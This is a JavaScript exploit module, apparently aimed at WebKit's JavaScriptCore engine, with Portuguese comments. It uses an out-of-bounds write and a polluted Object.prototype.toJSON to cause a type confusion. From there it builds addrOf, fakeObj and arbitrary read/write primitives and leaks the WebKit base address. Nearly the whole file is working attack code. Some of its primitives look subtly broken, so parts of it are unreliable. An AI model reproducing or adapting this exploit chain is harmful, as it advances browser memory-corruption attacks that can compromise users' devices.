// js/script3/testArrayBufferVictimCrash.mjs (v83_CorruptedArrayLeak - R44 - Addrof com Array Corrompido)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    // A primitiva arb_read original não será mais usada, construiremos a nossa
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Usaremos os offsets do config.mjs

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CAL_R44_WEBKIT = "Heisenbug_CorruptedArrayLeak_v83_CAL_R44_WebKitLeak";

// --- Configurações do Teste ---
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; // Mesmo offset para o gatilho inicial
const OOB_WRITE_VALUES_V83 = [0x41414141, 0xABABABAB]; // Valores para corrupção

// --- Globais para a nova primitiva de exploit ---
let corrupting_array = null;
let corrupted_array = null;
let addrOf_primitive = null;
let fakeObj_primitive = null;
let arb_read_v2 = null;
let arb_write_v2 = null;
// ---

let targetFunctionForLeak;
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    // Remove a checagem de NaN, pois nossa nova técnica não deve produzi-lo
    if (high === 0 && low < 0x10000) return false; // Ainda descarta ponteiros nulos ou muito baixos
    return true;
}

// [NOVA ESTRATÉGIA R44] Funções auxiliares para conversão de tipo para as primitivas
const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

function box(addr) {
    int_conversion_view[0] = BigInt(addr.toString());
    return float_conversion_view[0];
}

function unbox(float_val) {
    float_conversion_view[0] = float_val;
    return new AdvancedInt64(int_conversion_view[0]);
}
// --- Fim das funções auxiliares ---


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R44() { // Nome atualizado para R44
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CAL_R44_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + CorruptedArray Addrof + WebKit Leak (R44) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R44...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR44_Instance() { return `target_R44_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null,
        addrof_result: { success: false, msg: "Addrof (R44): Not run." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R44): Not run." },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };

    for (const current_oob_value of OOB_WRITE_VALUES_V83) {
        // Resetar estado da iteração
        corrupting_array = corrupted_array = addrOf_primitive = fakeObj_primitive = arb_read_v2 = arb_write_v2 = null;
        leaked_target_function_addr = null;
        let heisenbugConfirmedThisIter = false;
        let iter_addrof_result = { success: false, msg: "Addrof (R44): Not run in this iter." };
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R44): Not run in this iter." };
        let iter_primary_error = null;
        let M2_ref_iter_from_probe = null;

        const current_oob_hex_val = toHex(current_oob_value);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION R44: OOB Write Value: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);

        function toJSON_CA_Probe_Iter_Closure_R44() { // 'CA' de Corrupted Array
            const ctts = Object.prototype.toString.call(this);
            if (this === M2_ref_iter_from_probe && ctts === '[object Object]') {
                try {
                    // [NOVA ESTRATÉGIA R44]
                    // Em vez de definir um getter, criamos os dois arrays que serão sobrepostos.
                    // A corrupção de memória que já aconteceu (pelo oob_write_absolute)
                    // tem uma chance de corromper o cabeçalho de um desses arrays.
                    logS3(`[PROBE_R44] TC Detectada! 'this' é M2. Criando arrays para sobreposição...`, "vuln");
                    this.corrupting_array = new Float64Array(1);
                    this.corrupted_array = new Float64Array(1);
                    heisenbugConfirmedThisIter = true;
                    logS3(`[PROBE_R44] Arrays 'corrupting_array' e 'corrupted_array' criados no objeto M2.`, "debug");
                } catch (e) {
                     logS3(`[PROBE_R44] Erro ao criar arrays de sobreposição: ${e.message}`, "critical");
                }
                return this;
            } else if (this.is_victim_typed_array) {
                // Primeira chamada, cria o marcador M2.
                M2_ref_iter_from_probe = { marker_id_v83: "M2_Iter_R44" };
                return { marker_id_v83: "M1_Iter_R44", payload_M2: M2_ref_iter_from_probe };
            }
            return { type: ctts };
        }

        try {
            logS3(`  --- Fase 1 (R44): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150);
            
            let victim_typed_array = new Uint8Array(1);
            victim_typed_array.is_victim_typed_array = true; // Marca o objeto para a sonda

            const ppKey = 'toJSON';
            let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let polluted = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_CA_Probe_Iter_Closure_R44, writable: true, configurable: true, enumerable: false });
                polluted = true;
                JSON.stringify(victim_typed_array); // Ponto crítico que aciona a sonda
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }

            if (!heisenbugConfirmedThisIter || !M2_ref_iter_from_probe?.corrupted_array) {
                throw new Error("Falha na Fase 1: A Type Confusion não ocorreu ou os arrays de sobreposição não foram criados.");
            }
            logS3(`  Fase 1 (R44) SUCESSO: Type Confusion confirmada.`, "good");

            logS3(`  --- Fase 2 (R44): Construção das Primitivas (addrOf/fakeObj) ---`, "subtest", FNAME_CURRENT_ITERATION);
            
            // [NOVA ESTRATÉGIA R44] Atribui os arrays criados na sonda às variáveis globais
            corrupting_array = M2_ref_iter_from_probe.corrupting_array;
            corrupted_array = M2_ref_iter_from_probe.corrupted_array;

            // Checa se a corrupção de 'length' funcionou
            if (corrupted_array.length < 100) { // Um valor pequeno indica que a corrupção de length falhou
                 throw new Error(`A corrupção de 'length' falhou. Comprimento do corrupted_array é ${corrupted_array.length}, esperado > 100.`);
            }
            logS3(`  SUCESSO: Comprimento do 'corrupted_array' foi corrompido para: ${corrupted_array.length}`, "vuln");

            // Define as primitivas
            addrOf_primitive = (obj) => {
                corrupting_array[0] = obj;
                return unbox(corrupted_array[0]);
            };
            fakeObj_primitive = (addr) => {
                corrupted_array[0] = box(addr);
                return corrupting_array[0];
            };
            logS3("  Primitivas 'addrOf' e 'fakeObj' definidas.", "info");

            // Testa as primitivas
            leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
            logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");

            if (!isValidPointer(leaked_target_function_addr)) {
                throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
            }
            
            const fake_func = fakeObj_primitive(leaked_target_function_addr);
            if (fake_func !== targetFunctionForLeak) {
                throw new Error("Teste de fakeObj falhou. Objeto falsificado não corresponde ao original.");
            }
            logS3("  [TESTE AddrOf/FakeObj] SUCESSO: Primitivas validadas.", "good");
            iter_addrof_result = { success: true, msg: "addrOf/fakeObj criados e validados com sucesso via Corrupted Array.", leaked_object_addr: leaked_target_function_addr.toString(true) };


            logS3(`  --- Fase 3 (R44): Leitura/Escrita Arbitrária e WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
            
            // Define as primitivas de leitura/escrita v2
            arb_read_v2 = (addr) => {
                let fake_array = fakeObj_primitive(addr.sub(new AdvancedInt64(0, 0x10))); // Falsifica um Float64Array. Seu butterfly está em +0x10.
                return new AdvancedInt64(fake_array[0]);
            };
            arb_write_v2 = (addr, val) => {
                let fake_array = fakeObj_primitive(addr.sub(new AdvancedInt64(0, 0x10)));
                fake_array[0] = box(val);
            };
            logS3("  Primitivas 'arb_read_v2' e 'arb_write_v2' definidas.", "info");
            
            // Executa a mesma lógica de WebKit Leak, mas com a nova primitiva de leitura
            const ptr_to_executable_instance = arb_read_v2(leaked_target_function_addr.add(new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET)));
            logS3(`  WebKitLeak: Ponteiro para ExecutableInstance: ${ptr_to_executable_instance.toString(true)}`, 'leak');
            if(!isValidPointer(ptr_to_executable_instance)) throw new Error("Ponteiro para ExecutableInstance inválido.");

            const ptr_to_jit_or_vm = arb_read_v2(ptr_to_executable_instance.add(new AdvancedInt64(0, 0x8))); // JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM
            logS3(`  WebKitLeak: Ponteiro para JIT/VM: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
            if(!isValidPointer(ptr_to_jit_or_vm)) throw new Error("Ponteiro para JIT/VM inválido.");

            const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
            const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);
            
            iter_webkit_leak_result = { success: true, msg: `Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

        } catch (e) {
            iter_primary_error = e;
            logS3(`  ERRO na iteração R44: ${e.message}`, "critical", FNAME_CURRENT_ITERATION);
            console.error(`Erro na iteração ${current_oob_hex_val}:`, e);
        } finally {
            await clearOOBEnvironment();
        }

        // Lógica de sumarização e seleção do melhor resultado
        let current_iter_summary = {
            oob_value: current_oob_hex_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            addrof_result_this_iter: iter_addrof_result,
            webkit_leak_result_this_iter: iter_webkit_leak_result,
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);

        if (!current_iter_summary.error && iter_webkit_leak_result.success) {
            best_result_for_runner = {
                errorOccurred: null,
                addrof_result: iter_addrof_result,
                webkit_leak_result: iter_webkit_leak_result,
                oob_value_used: current_oob_hex_val,
                heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
            };
             document.title = `${FNAME_CURRENT_TEST_BASE}_R44: WebKitLeak OK!`;
            break; // Para o loop na primeira iteração de sucesso total
        } else if (!current_iter_summary.error && iter_addrof_result.success && !best_result_for_runner.addrof_result.success) {
            // Salva o melhor resultado até agora se o addrof funcionou mas o leak não
             best_result_for_runner = { ...current_iter_summary };
             document.title = `${FNAME_CURRENT_TEST_BASE}_R44: Addrof OK`;
        }
    }
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R44): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return { ...best_result_for_runner, iteration_results_summary: iteration_results_summary };
}
